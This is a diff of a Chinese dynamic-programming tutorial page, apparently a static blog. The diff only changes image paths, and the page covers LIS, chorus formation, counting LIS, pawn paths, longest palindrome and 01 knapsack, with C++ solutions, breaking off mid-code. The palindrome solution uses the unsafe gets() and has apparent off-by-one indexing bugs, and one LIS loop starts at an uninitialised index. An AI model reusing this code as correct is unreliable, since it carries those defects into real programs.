 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn],d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, len = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	d[++len] = A[<span class="number">1</span>];<span class="comment">//初始化</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i] &gt;= d[len])</span><br><span class="line">			d[++len] = A[i];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> *j = <span class="built_in">upper_bound</span>(d + <span class="number">1</span>, d + len + <span class="number">1</span>, A[i]);</span><br><span class="line">			*j = A[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1784,12 +1953,12 @@
 <p>upper_bound(first,last,val)：STL algorithm中的函数，用于在一个<strong>升序</strong>数组/容器中。在[first,last)中找到第一个值大于val的元素并返回其指针，first、last也是位置指针。同理还有lower_bound，它找的是第一个值大于等于val的元素，他们都采用二分查找，复杂度为O(logn)。</p>
 <p>如果是降序容器，需要用greater<int>()重载upper_bound。</p>
 </blockquote>
-<h5 id="拓1：合唱队形"><a href="#拓1：合唱队形" class="headerlink" title="拓1：合唱队形"></a>拓1：合唱队形</h5><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E5%90%88%E5%94%B1%E9%98%9F%E5%BD%A2.jpg" alt="合唱队形"></p>
+<h5 id="拓1：合唱队形"><a href="#拓1：合唱队形" class="headerlink" title="拓1：合唱队形"></a>拓1：合唱队形</h5><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E5%90%88%E5%94%B1%E9%98%9F%E5%BD%A2.jpg" alt="合唱队形"></p>
 <p><strong>解法：</strong>此题就是求最长的山形队列，采用两个方向LIS的方法，枚举每个人站在中间时的最优解即可。使用两个dp数组存入从左到右和从右到左的以i结尾的LIS长度信息，此时dp1[i]+dp2[i]-1即是最长的山形队列长度。</p>
 <p><strong>代码：</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp1[maxn],dp2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//正向升序序列</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp1[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt; A[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp1[i] = <span class="built_in">max</span>(dp1[i], dp1[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--)<span class="comment">//反向升序序列</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp2[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = n; j &gt; i; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt; A[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp2[i] = <span class="built_in">max</span>(dp2[i], dp2[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ans = <span class="built_in">max</span>(ans, dp1[i] + dp2[i] - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n-ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h5 id="拓2：低价购买"><a href="#拓2：低价购买" class="headerlink" title="拓2：低价购买"></a>拓2：低价购买</h5><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E4%BD%8E%E4%BB%B7%E8%B4%AD%E4%B9%B0.jpg" alt="低价购买"></p>
+<h5 id="拓2：低价购买"><a href="#拓2：低价购买" class="headerlink" title="拓2：低价购买"></a>拓2：低价购买</h5><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E4%BD%8E%E4%BB%B7%E8%B4%AD%E4%B9%B0.jpg" alt="低价购买"></p>
 <p><strong>解法：</strong>此题主要是要求LIS的数目，采用另一个数组f来记录LIS方案数。其中倘若 <code>a[i] = a[j] &amp;&amp; dp[i] = dp[j]</code> 则意味着以i结尾的LIS和以j结尾的LIS相同，此时其中一个LIS不计入方案（<u>两个相同取一个即可</u>）；若 <code>a[i] &lt; a[j] &amp;&amp; dp[i] = dp[j] + 1</code> 则意味着以i结尾的LIS可以由以j结尾的LIS转移过来，此时的方案数等于f[j] + f[i]。（<u>解释：如果有j1和j2，他们的LIS长度相同并且都等于dp[i]-1，意味着i可以由j1转移过来，也可以由j2转移过来</u><u>，则到达i的方案数为j1的方案数+j2的方案数</u>）边界条件：LIS长为1，此时方案数为1；其他情况方案数初始化为0.</p>
 <p><strong>代码：</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn],f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">int</span> maxx = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)<span class="comment">//LIS</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] &lt; A[j])</span><br><span class="line">			&#123;</span><br><span class="line">				dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		maxx = <span class="built_in">max</span>(maxx, dp[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (dp[i] == <span class="number">1</span>)f[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dp[i] == dp[j] &amp;&amp; A[i] == A[j])</span><br><span class="line">				f[j] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (dp[i] == dp[j] + <span class="number">1</span> &amp;&amp; A[i] &lt; A[j])</span><br><span class="line">				f[i] += f[j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dp[i] == maxx)</span><br><span class="line">			ans += f[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, maxx, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1797,13 +1966,13 @@
 
 
 <h3 id="二维动态规划"><a href="#二维动态规划" class="headerlink" title="二维动态规划"></a>二维动态规划</h3><hr>
-<h4 id="1-马拦过河卒"><a href="#1-马拦过河卒" class="headerlink" title="1.马拦过河卒"></a>1.马拦过河卒</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E8%BF%87%E6%B2%B3%E5%8D%92.jpg" alt="过河卒"></p>
+<h4 id="1-马拦过河卒"><a href="#1-马拦过河卒" class="headerlink" title="1.马拦过河卒"></a>1.马拦过河卒</h4><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E8%BF%87%E6%B2%B3%E5%8D%92.jpg" alt="过河卒"></p>
 <p><strong>解法：</strong>此题用二维数组dp记录每个坐标的路径条数，则$dp[n][m]$即所求。</p>
 <p>状态转移方程：$dp[x][y] = dp[x-1][y] + dp[x][y-1]$.边界值：$dp[0][y] = 1$和$dp[x][0] = 1$.即坐标轴上的值路径均为1.需要注意的是，倘若马的控制点在坐标轴上，则该点及其后的点均不可达（路径数为0）</p>
 <p><strong>代码：</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> horse[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="keyword">int</span> stepx[<span class="number">8</span>] = &#123; <span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> stepy[<span class="number">8</span>] = &#123; <span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m, n, X, Y;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;X, &amp;Y);</span><br><span class="line">	horse[X][Y] = <span class="literal">true</span>;<span class="comment">//马所在位置也被控制</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)<span class="comment">//初始化马的控制点，采用二维数组记录棋盘，被马控制则为true</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x = X + stepx[i];</span><br><span class="line">		<span class="keyword">int</span> y = Y + stepy[i];</span><br><span class="line">		<span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt;= n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt;= m)</span><br><span class="line">			horse[x][y] = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++)<span class="comment">//y状态初值,注意马的影响</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!horse[<span class="number">0</span>][i])</span><br><span class="line">			dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//注意，倘若坐标轴上有一点不可达，则其后的点都不可达</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)<span class="comment">//x状态初值,注意马的影响</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!horse[i][<span class="number">0</span>])</span><br><span class="line">			dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//注意，倘若坐标轴上有一点不可达，则其后的点都不可达</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//二维数组状态转移</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!horse[i][j])</span><br><span class="line">				dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dp[n][m]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h4 id="2-最长回文串"><a href="#2-最长回文串" class="headerlink" title="2.最长回文串"></a>2.最长回文串</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2.jpg" alt="最长回文串"></p>
+<h4 id="2-最长回文串"><a href="#2-最长回文串" class="headerlink" title="2.最长回文串"></a>2.最长回文串</h4><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2.jpg" alt="最长回文串"></p>
 <p><strong>解法：</strong>以$dp[i][j]$表示A[i]到A[j]的子串是不是回文串，若是则置其值为1，不是则置为0.那么求$dp[i][j]$的值有两种情形：1.A[i] != A[j]则$dp[i][j]$必为0。2.A[i] == A[j]则$dp[i][j]$是否是回文串取决于$dp[i+1][j-1]$是否是回文串。</p>
 <p><u>状态转移方程如下</u>：<br>$$<br>dp[i][j] =<br>\left{<br>             \begin{array}{<strong>lr</strong>}<br>             dp[i+1][j-1]&amp;,A[i] = A[j]  \<br>            0&amp;, A[i] != A[j]<br>             \end{array}<br>\right.<br>$$<br><u>边界条件为</u>：1.长度为1的子串dp值均为1（都是回文串）2.长度为2的子串根据两个字母值是否相等来确定dp的值。即为：$dp[i][i] = 1 ,dp[i][i+1] = (A[i] == A[i+1]) ? 1 : 0$</p>
 <p>以下分析如何求dp数组：倘若按照i，j按顺序遍历来求解，例如固定i=1，j从1开始遍历，当开始计算$dp[1][3]$时，我们需要$dp[2][2]$的值，而此时i=1，$dp[2][2]$的值还未知。事实上，以任何顺序遍历求解都无法保证完成。所以我们按照<u>长度和子串首位遍历</u>求解，从长度为3的子串开始，枚举子串的起始位置（i处）。</p>
@@ -1811,7 +1980,7 @@
 <p><strong>代码：</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1010</span>;</span><br><span class="line"><span class="keyword">char</span> A[maxn];</span><br><span class="line"><span class="keyword">int</span> dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">gets</span>(A);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(A),ans = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));<span class="comment">//string.h中的内存赋值函数，其中各个参数分别为：内存指针，要赋的值，填充的字节数。此行功能为将dp数组赋值为0.</span></span><br><span class="line">    <span class="comment">//设置边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == A[i+<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                ans = <span class="number">2</span>;<span class="comment">//注意更新当前最长回文串长度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> l = <span class="number">3</span>; l &lt;= len; l++)<span class="comment">//枚举字串长度</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i + l - <span class="number">1</span> &lt; len; i++)<span class="comment">//枚举子串起始位置</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = i + l - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == A[j] &amp;&amp; dp[i+<span class="number">1</span>][j<span class="number">-1</span>] == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j] = <span class="number">1</span>;</span><br><span class="line">                ans = l;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-背包问题"><a href="#3-背包问题" class="headerlink" title="3.背包问题"></a>3.背包问题</h4><h5 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h5><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85.jpg" alt="01背包"></p>
+<h4 id="3-背包问题"><a href="#3-背包问题" class="headerlink" title="3.背包问题"></a>3.背包问题</h4><h5 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h5><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85.jpg" alt="01背包"></p>
 <p><strong>解法：</strong>此题采用动态规划方法，将n件物品编号，拿到第i件物品时最大的总价值dp[i]取决于拿第i-1件物品时的最大总价值。当拿到第i件物品时背包容量不够，则dp[i] = dp[i-1]；当拿到第i件物品时背包容量足够容纳该物品，则可以选择拿dp[i] = dp[i-1]+c[i]或者不拿dp[i] = dp[i-1]。我们除了记录i之外，还需要一维来记录数组容量，倘若只有i物品的选取与否来决定最大价值显然会变成贪心算法，而贪心算法无法求出最优解。当我们可以选取物品i时（v&gt;w[i]），就去考虑小背包的最大价值。最后遍历第n件物品的v（0~V），最大值即所求。（并没有要求背包装满）</p>
 <p><u>状态转移方程如下</u>:$dp[i][v] = max(dp[i-1][v],dp[i-1][v-w[i]] + c[i]) (1 \leq i \leq n , w[i] \leq v \leq V)$</p>
 <p><u>边界条件</u>：$dp[0][v] = 0 (0 \leq v \leq V)$ 即前0件物品放入任何容量的背包中都只能获得价值0.</p>
@@ -1820,291 +1989,10 @@
 <p>假设i=1，则图中第一行的值全为0，第二行的值根据第一行来确定，如图所示。在优化的解法中，我们仅有一行来保存数据，在初始化时将它设置为全零。我们计算第i行的数据时（即图中第二行），在对每一个v的计算中，需要参考当前块的值和v-w[i]块的值，而在更新数组之前这两块的值都是上一次的，即i-1行的，正是我们所需要的；在更新之后当前的块则是第i行的了，供给i+1行使用。</p>
 <p>根据上面的描述我们不难发现，必须从后往前更新数组才可以。因为倘若从前往后更新，则数组左边是已经更新（第i行）的数据，右边是更新前（第i-1行）的数据，而在往右更新时，我们需要左边上一行的数据来比较大小，此时左边上一行的数据已经被覆盖掉了。</p>
 <p><u>优化后的状态转移方程</u>：$dp[v] = max(dp[v], dp[v - w[i]] + c[i]) (1 \leq i \leq n, w[i] \leq v \leq V)$</p>
-<p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="01背包示意图"></p>
+<p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="01背包示意图"></p>
 <p><strong>代码：</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span 